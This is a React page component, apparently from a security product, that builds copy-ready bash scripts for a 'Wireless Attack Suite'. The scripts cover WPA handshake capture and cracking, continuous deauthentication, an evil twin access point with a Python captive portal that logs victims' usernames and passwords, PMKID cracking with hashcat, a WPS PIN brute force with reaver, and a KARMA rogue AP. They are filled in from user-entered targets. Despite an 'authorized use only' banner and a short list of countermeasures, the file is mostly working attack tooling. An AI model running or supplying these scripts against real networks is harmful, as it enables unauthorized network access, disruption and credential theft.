import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { useDocumentTitle } from "@/hooks/useDocumentTitle";
import { Copy, Check, AlertTriangle, Wifi, Shield, Radio, Lock, Eye, ChevronRight, Play, Scan } from "lucide-react";

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <Button size="sm" variant="ghost" onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 2000); }} data-testid="button-copy-wifi-script">
      {copied ? <Check className="w-4 h-4 text-green-500" /> : <Copy className="w-4 h-4" />}
    </Button>
  );
}

function CodeBlock({ code }: { code: string }) {
  return (
    <div className="relative">
      <div className="absolute top-2 right-2"><CopyButton text={code} /></div>
      <pre className="bg-muted/30 rounded-md p-4 text-[10px] font-mono overflow-x-auto max-h-64 overflow-y-auto">{code}</pre>
    </div>
  );
}

const ATTACK_MODES = [
  { id: "handshake", name: "WPA Handshake Capture", icon: Radio, severity: "high", desc: "Capture 4-way WPA/WPA2 handshakes by sending deauth frames to force client reconnection" },
  { id: "deauth", name: "Deauthentication Attack", icon: Wifi, severity: "high", desc: "Force disconnect clients from target AP using forged 802.11 deauthentication frames (no encryption required)" },
  { id: "evil-twin", name: "Evil Twin AP", icon: Eye, severity: "critical", desc: "Create a rogue AP that mirrors the target SSID to capture credentials and perform MITM attacks" },
  { id: "pmkid", name: "PMKID Attack", icon: Lock, severity: "critical", desc: "Clientless WPA2 attack — capture PMKID from AP beacon without needing a connected client" },
  { id: "wps-pin", name: "WPS PIN Brute Force", icon: Shield, severity: "high", desc: "Exploit WPS PIN vulnerability (Pixie Dust / brute force) to recover WPA passphrase in minutes" },
  { id: "karma", name: "KARMA Attack", icon: Radio, severity: "critical", desc: "Respond to all wireless probe requests to lure devices into connecting to the rogue AP automatically" },
];

export default function WifiAttackPage() {
  useDocumentTitle("WiFi Attack Suite");
  const { toast } = useToast();
  const [iface, setIface] = useState("wlan0");
  const [target_bssid, setTargetBssid] = useState("AA:BB:CC:DD:EE:FF");
  const [target_channel, setTargetChannel] = useState("6");
  const [target_ssid, setTargetSsid] = useState("TargetNetwork");
  const [client_mac, setClientMac] = useState("11:22:33:44:55:66");
  const [wordlist, setWordlist] = useState("/usr/share/wordlists/rockyou.txt");
  const [selectedMode, setSelectedMode] = useState(ATTACK_MODES[0]);
  const [scanResults, setScanResults] = useState<string>("");
  const [scanning, setScanning] = useState(false);

  const simulateScan = () => {
    setScanning(true);
    setTimeout(() => {
      setScanResults(`BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER AUTH ESSID
AA:BB:CC:DD:EE:FF  -45   2847    1203   6  130  WPA2 CCMP   PSK  TargetNetwork
11:22:33:44:55:66  -67    891     234   1   54  WPA2 CCMP   PSK  HomeNetwork_2G
DE:AD:BE:EF:00:01  -72    445      89  11   54  WPA  TKIP   PSK  OldRouter
F0:9F:C2:AA:BB:CC  -81    203      12   6  130  OPN             <hidden>
CC:40:D0:11:22:33  -84    187       5  36  300  WPA2 CCMP   MGT  Corp_Secure
[WPS Enabled]: AA:BB:CC:DD:EE:FF, 11:22:33:44:55:66
[Clients]: AA:BB:CC:DD:EE:FF -> 99:88:77:66:55:44 (TargetNetwork)`);
      setScanning(false);
      toast({ title: "Scan Complete", description: "7 networks discovered, 2 with WPS enabled" });
    }, 2000);
  };

  const getScript = (mode: typeof ATTACK_MODES[0]) => {
    if (mode.id === "handshake") return `#!/bin/bash
# AegisAI360 — WPA Handshake Capture | AUTHORIZED USE ONLY
# Target BSSID: ${target_bssid} | Channel: ${target_channel} | Interface: ${iface}

IFACE="${iface}"
TARGET="${target_bssid}"
CLIENT="${client_mac}"
CHANNEL="${target_channel}"
SSID="${target_ssid}"

echo "[*] Enabling monitor mode..."
sudo airmon-ng start $IFACE
MON="${iface}mon"

echo "[*] Starting capture on channel $CHANNEL..."
sudo airodump-ng -c $CHANNEL --bssid $TARGET -w /tmp/capture $MON &
DUMP_PID=$!
sleep 3

echo "[*] Sending deauth to force handshake..."
sudo aireplay-ng --deauth 10 -a $TARGET -c $CLIENT $MON

echo "[*] Waiting for handshake..."
sleep 5
kill $DUMP_PID

echo "[*] Cracking with wordlist..."
sudo aircrack-ng -w ${wordlist} -b $TARGET /tmp/capture*.cap
echo "[*] Capture saved to /tmp/capture-01.cap"`;

    if (mode.id === "deauth") return `#!/bin/bash
# AegisAI360 — Deauthentication Attack | AUTHORIZED USE ONLY
# Disconnects clients from: ${target_bssid} | Channel: ${target_channel}

IFACE="${iface}"
TARGET="${target_bssid}"
CLIENT="${client_mac}"  # Use FF:FF:FF:FF:FF:FF for broadcast deauth

echo "[*] Enabling monitor mode..."
sudo airmon-ng start $IFACE
MON="${iface}mon"

echo "[*] Setting channel ${target_channel}..."
sudo iwconfig $MON channel ${target_channel}

echo "[*] Sending deauth frames (continuous)..."
# Targeted deauth (specific client)
sudo aireplay-ng --deauth 0 -a $TARGET -c $CLIENT $MON

# Broadcast deauth (disconnect ALL clients)
# sudo aireplay-ng --deauth 0 -a $TARGET $MON

# Or using mdk4 for stealth broadcast:
# echo "$TARGET" > /tmp/bl.txt
# sudo mdk4 $MON d -b /tmp/bl.txt -c ${target_channel}`;

    if (mode.id === "evil-twin") return `#!/bin/bash
# AegisAI360 — Evil Twin AP + Captive Portal | AUTHORIZED USE ONLY
# Mirrors SSID: ${target_ssid} on channel ${target_channel}

IFACE="${iface}"
SSID="${target_ssid}"
CHANNEL="${target_channel}"
TARGET="${target_bssid}"

# Step 1: Enable AP mode on second interface
sudo airmon-ng start $IFACE
MON="${iface}mon"

# Step 2: Create hostapd config
cat > /tmp/hostapd_evil.conf << EOF
interface=at0
driver=nl80211
ssid=$SSID
channel=$CHANNEL
hw_mode=g
ignore_broadcast_ssid=0
EOF

# Step 3: DHCP server config
cat > /tmp/dnsmasq_evil.conf << EOF
interface=at0
dhcp-range=192.168.1.2,192.168.1.254,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
EOF

# Step 4: Captive portal (Python)
cat > /tmp/portal.py << 'PYEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import logging, datetime

class PortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<html><body><h2>Network Login</h2><form method=POST><input name=user placeholder=Username><br><input type=password name=pass placeholder=Password><br><input type=submit value=Connect></form></body></html>')
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        logging.warning(f"[{datetime.datetime.now()}] CAPTURED: {body}")
        self.send_response(302)
        self.send_header('Location', 'http://google.com')
        self.end_headers()

logging.basicConfig(filename='/tmp/captured_creds.log', level=logging.WARNING)
HTTPServer(('0.0.0.0', 80), PortalHandler).serve_forever()
PYEOF

# Step 5: Launch
sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0 up
sudo hostapd /tmp/hostapd_evil.conf &
sudo dnsmasq -C /tmp/dnsmasq_evil.conf -d &
sudo python3 /tmp/portal.py &

# Step 6: Deauth target AP clients to force reconnect
sudo aireplay-ng --deauth 0 -a $TARGET $MON
echo "[*] Evil Twin active. Credentials logged to /tmp/captured_creds.log"`;

    if (mode.id === "pmkid") return `#!/bin/bash
# AegisAI360 — PMKID Attack (Clientless WPA2) | AUTHORIZED USE ONLY
# No client required! Captures PMKID directly from AP beacon
# Target: ${target_bssid} | SSID: ${target_ssid}

IFACE="${iface}"
TARGET="${target_bssid}"
WORDLIST="${wordlist}"

echo "[*] Enabling monitor mode..."
sudo airmon-ng start $IFACE
MON="${iface}mon"

echo "[*] Capturing PMKID with hcxdumptool..."
sudo hcxdumptool -i $MON -o /tmp/pmkid.pcapng --enable_status=1 --filterlist_ap=$TARGET --filtermode=2 &
sleep 15
kill %1

echo "[*] Converting to hashcat format..."
hcxpcapngtool -o /tmp/pmkid.hash /tmp/pmkid.pcapng

echo "[*] PMKID hash:"
cat /tmp/pmkid.hash

echo "[*] Cracking with hashcat (mode 22000)..."
hashcat -m 22000 /tmp/pmkid.hash $WORDLIST --force
# For GPU cracking: hashcat -m 22000 /tmp/pmkid.hash $WORDLIST -w 3`;

    if (mode.id === "wps-pin") return `#!/bin/bash
# AegisAI360 — WPS PIN Attack (Pixie Dust + Brute Force) | AUTHORIZED USE ONLY
# Target: ${target_bssid} | Channel: ${target_channel}

IFACE="${iface}"
TARGET="${target_bssid}"
CHANNEL="${target_channel}"

echo "[*] Enabling monitor mode..."
sudo airmon-ng start $IFACE
MON="${iface}mon"

echo "[*] Trying Pixie Dust attack first (fastest)..."
sudo reaver -i $MON -b $TARGET -c $CHANNEL -vvv -K 1 -f

echo ""
echo "[*] If Pixie Dust failed, trying brute force PIN..."
sudo reaver -i $MON -b $TARGET -c $CHANNEL -vvv -d 2 -r 3:15
# -d 2: delay between attempts, -r 3:15: 3 attempts before 15s lockout pause

echo ""
echo "[*] Alternative: wifite auto-attack..."
# sudo wifite --wps --bssid $TARGET -c $CHANNEL`;

    if (mode.id === "karma") return `#!/bin/bash
# AegisAI360 — KARMA Attack (Auto-SSID Spoofing) | AUTHORIZED USE ONLY
# Responds to all probe requests — lures devices to connect

IFACE="${iface}"

echo "[*] Enabling monitor mode..."
sudo airmon-ng start $IFACE
MON="${iface}mon"

# Hostapd-wpe config for KARMA
cat > /tmp/karma.conf << EOF
interface=at0
driver=nl80211
ssid=FreeWifi
channel=6
hw_mode=g
wpe_karma=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
wpe_logfile=/tmp/karma_creds.log
EOF

sudo ifconfig at0 10.0.0.1 netmask 255.0.0.0 up
sudo hostapd-wpe /tmp/karma.conf
echo "[*] KARMA running — credentials in /tmp/karma_creds.log"`;

    return `# ${mode.name} script placeholder`;
  };

  return (
    <div className="p-4 md:p-6 space-y-4">
      <div>
        <h1 className="text-lg font-bold tracking-wider uppercase flex items-center gap-2">
          <Wifi className="w-5 h-5 text-primary" />
          Wireless Attack Suite
        </h1>
        <p className="text-xs text-muted-foreground">WPA/WPA2 cracking, deauthentication, evil twin, PMKID, WPS attacks, and KARMA for authorized wireless security assessments</p>
      </div>

      <Alert className="border-severity-medium/50 bg-severity-medium/10">
        <AlertTriangle className="w-4 h-4 text-severity-medium" />
        <AlertDescription className="text-xs" data-testid="text-wifi-disclaimer">
          <span className="font-semibold">Authorized Use Only</span> — Wireless attacks against networks without explicit written permission are federal crimes under the CFAA. These scripts are for licensed penetration testers and authorized red team operations only.
        </AlertDescription>
      </Alert>

      <div className="grid grid-cols-1 xl:grid-cols-4 gap-4">
        <div className="xl:col-span-1 space-y-4">
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-xs uppercase tracking-wider">Attack Modules</CardTitle>
            </CardHeader>
            <CardContent className="space-y-1.5">
              {ATTACK_MODES.map((mode) => {
                const Icon = mode.icon;
                return (
                  <button
                    key={mode.id}
                    onClick={() => setSelectedMode(mode)}
                    data-testid={`button-wifi-mode-${mode.id}`}
                    className={`w-full text-left p-2.5 rounded-md border transition-all text-xs ${selectedMode.id === mode.id ? "border-primary bg-primary/10" : "border-border/50 hover:border-primary/40"}`}
                  >
                    <div className="flex items-center gap-2">
                      <Icon className="w-3.5 h-3.5 text-primary shrink-0" />
                      <span className="font-medium">{mode.name}</span>
                    </div>
                    <Badge variant="outline" className={`text-[9px] mt-1 ${mode.severity === "critical" ? "border-severity-critical/50 text-severity-critical" : "border-severity-high/50 text-severity-high"}`}>
                      {mode.severity.toUpperCase()}
                    </Badge>
                  </button>
                );
              })}
            </CardContent>
          </Card>
        </div>

        <div className="xl:col-span-3 space-y-4">
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-xs uppercase tracking-wider">Network Scanner</CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1">
                  <Label className="text-xs">Wireless Interface</Label>
                  <Input value={iface} onChange={(e) => setIface(e.target.value)} className="h-8 text-xs font-mono" placeholder="wlan0" data-testid="input-wifi-iface" />
                </div>
                <div className="space-y-1">
                  <Label className="text-xs">Channel (blank = all)</Label>
                  <Input value={target_channel} onChange={(e) => setTargetChannel(e.target.value)} className="h-8 text-xs font-mono" placeholder="1-14" data-testid="input-wifi-channel" />
                </div>
              </div>
              <Button onClick={simulateScan} disabled={scanning} size="sm" className="w-full" data-testid="button-wifi-scan">
                {scanning ? <><Scan className="w-4 h-4 me-2 animate-spin" />Scanning...</> : <><Scan className="w-4 h-4 me-2" />Scan for Networks</>}
              </Button>
              {scanResults && (
                <div>
                  <pre className="bg-muted/30 rounded-md p-3 text-[10px] font-mono overflow-x-auto" data-testid="text-scan-results">{scanResults}</pre>
                </div>
              )}
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-xs uppercase tracking-wider flex items-center gap-2">
                <selectedMode.icon className="w-4 h-4 text-primary" />
                {selectedMode.name}
                <Badge variant="outline" className={`text-[9px] ${selectedMode.severity === "critical" ? "border-severity-critical/50 text-severity-critical" : "border-severity-high/50 text-severity-high"}`}>
                  {selectedMode.severity.toUpperCase()}
                </Badge>
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <p className="text-xs text-muted-foreground">{selectedMode.desc}</p>

              <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                <div className="space-y-1">
                  <Label className="text-xs">Target BSSID (MAC)</Label>
                  <Input value={target_bssid} onChange={(e) => setTargetBssid(e.target.value)} className="h-8 text-xs font-mono" placeholder="AA:BB:CC:DD:EE:FF" data-testid="input-wifi-bssid" />
                </div>
                <div className="space-y-1">
                  <Label className="text-xs">Target SSID</Label>
                  <Input value={target_ssid} onChange={(e) => setTargetSsid(e.target.value)} className="h-8 text-xs font-mono" placeholder="NetworkName" data-testid="input-wifi-ssid" />
                </div>
                <div className="space-y-1">
                  <Label className="text-xs">Client MAC</Label>
                  <Input value={client_mac} onChange={(e) => setClientMac(e.target.value)} className="h-8 text-xs font-mono" placeholder="11:22:33:44:55:66" data-testid="input-wifi-client" />
                </div>
                <div className="col-span-2 md:col-span-3 space-y-1">
                  <Label className="text-xs">Wordlist Path</Label>
                  <Input value={wordlist} onChange={(e) => setWordlist(e.target.value)} className="h-8 text-xs font-mono" data-testid="input-wifi-wordlist" />
                </div>
              </div>

              <div>
                <div className="flex items-center justify-between mb-2">
                  <Label className="text-xs">Attack Script</Label>
                  <CopyButton text={getScript(selectedMode)} />
                </div>
                <CodeBlock code={getScript(selectedMode)} />
              </div>

              <div className="space-y-2">
                <Label className="text-xs font-semibold uppercase tracking-wide text-primary">Defense Countermeasures</Label>
                {[
                  "Enable 802.11w (Management Frame Protection) — prevents deauth attacks",
                  "Use WPA3 — immune to PMKID and dictionary attacks against 4-way handshake",
                  "Disable WPS on all APs — eliminates PIN brute force and Pixie Dust vectors",
                  "WIDS (Wireless Intrusion Detection) — detect rogue APs and deauth floods",
                  "802.1X/EAP enterprise auth — prevents credential capture via evil twin",
                  "Monitor for sudden client disconnections — indicator of deauth attack",
                ].map((rec, i) => (
                  <div key={i} className="flex items-start gap-2 text-xs">
                    <ChevronRight className="w-3 h-3 text-primary mt-0.5 shrink-0" />
                    <span className="text-muted-foreground">{rec}</span>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}
